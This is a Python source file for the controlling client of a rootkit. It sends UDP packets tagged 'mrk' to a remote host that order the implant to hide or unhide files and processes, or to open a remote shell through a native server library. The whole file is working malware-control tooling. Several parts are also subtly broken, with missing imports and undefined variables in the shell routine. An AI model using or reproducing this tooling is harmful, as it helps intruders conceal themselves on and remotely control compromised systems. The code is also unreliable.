import sys
import random
import struct
from argparse import ArgumentParser
from enum import Enum
from threading import Condition, Thread
from socket import socket, IPPROTO_UDP, SOCK_DGRAM, AF_INET, SocketType, timeout as timeout_error
from ctypes import cdll, create_string_buffer
from typing import Dict, Optional

JOB_ID_SIZE = 2
REQUEST_PORT = 1111
MAGIC = b'mrk'
SOCK_TIMEOUT = 0.1

SERVER_SO = Path(__file__).parent().parent() / 'usermode' / 'server.so'
SERVER = cdll.LoadLibrary(SERVER_SO)


class CommandType(Enum):
    HIDE_FILE = b'hfile'
    UNHIDE_FILE = b'ufile'
    HIDE_PROCESS = b'hproc'
    UNHIDE_PROCESS = b'uproc'
    EXIT = b'fexit'
    SHELL = b'shell'

def _open_shell(socket: SocketType, prefix: bytes):
    prefix_buff = create_string_buffer(prefix)
    SERVER.start_server(socket.file_no(), prefix_buff)


class Client:
    def __init__(self, remote: Optional[str] = None):
        self._sock: SocketType = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        # TODO: Should the socket just be non-blocking? That might slow down all other threads.
        self._sock.settimeout(SOCK_TIMEOUT)
        # TODO: Use TTLCache from cacheutils to free responses that have not been awaited to.
        self._responses: Dict[int, int] = {}
        self._condition: Condition = Condition()
        self._thread = Thread(target=self._listen_for_responses)
        self._should_stop = False
        self._remote = remote

    def bind(self, remote):
        self._remote = remote

    def start(self):
        self._thread.start()

    def sendto(self, remote: str, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
        assert self._thread.is_alive(), 'client must be started before sending'
        # TODO: Switch to randbytes in python 3.9
        job_id = random.randint(0, 2 ** (JOB_ID_SIZE * 8) - 1)
        # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
        msg = MAGIC + struct.pack('H', job_id) + command.value + argument.encode('ascii')
        self._sock.sendto(msg, (remote, REQUEST_PORT))
        return self._await_response(job_id, timeout)

    def send(self, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
        return self.sendto(self._remote, command, argument, timeout=timeout)

    def open_shell(self, *, timeout: Optional[float] = None):
        assert self._thread.is_alive(), 'client must be started before sending'
        # TODO: Switch to randbytes in python 3.9
        job_id = random.randint(0, 2 ** (JOB_ID_SIZE * 8) - 1)
        # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
        prefix = MAGIC + struct.pack('H', job_id)
        self._sock.sendto(msg + CommandType.SHELL.value, (remote, REQUEST_PORT))
        res = self._await_response(job_id, timeout)
        if res:
            return res
        self._sock.connect((self._remote, REQUEST_PORT))
        _open_shell(self._sock, prefix)

    def close(self):
        self._should_stop = True
        self._thread.join()
        self._sock.close()

    def _submit_response(self, job_id: int, status: int) -> None:
        with self._condition:
            self._responses[job_id] = status
            self._condition.notify_all()

    def _await_response(self, job_id: int, timeout: Optional[float] = None) -> Optional[int]:
        with self._condition:
            notified = self._condition.wait_for(lambda: job_id in self._responses, timeout=timeout)
        # Check whether the timeout was reached.
        if not notified:
            return None
        # Free the condition and response to avoid the memory usage inflating.
        return self._responses.pop(job_id)

    def _listen_for_responses(self):
        while not self._should_stop:
            try:
                response = self._sock.recv(3)
            except timeout_error:
                continue
            job_id, response_status = struct.unpack('Hb', response)
            self._submit_response(job_id, response_status)


def main():
    parser = ArgumentParser()
    parser.add_argument('remote_ip', type=str)
    parser.add_argument('command_type', type=lambda val: CommandType(val.encode('ascii')))
    parser.add_argument('argument', type=str, nargs='?', default='')
    ns = parser.parse_args(sys.argv[1:])
    s = Client(ns.remote_ip)
    s.start()
    if (ns.command_type == CommandType.SHELL):
        s.open_shell(timeout=1)
        return 0
    status = s.send(ns.command_type, ns.argument, timeout=1)
    s.close()
    if status is None:
        print('timed out')
        return 1
    print(f'remote returned: {status}')
    return 0


if __name__ == '__main__':
    sys.exit(main())
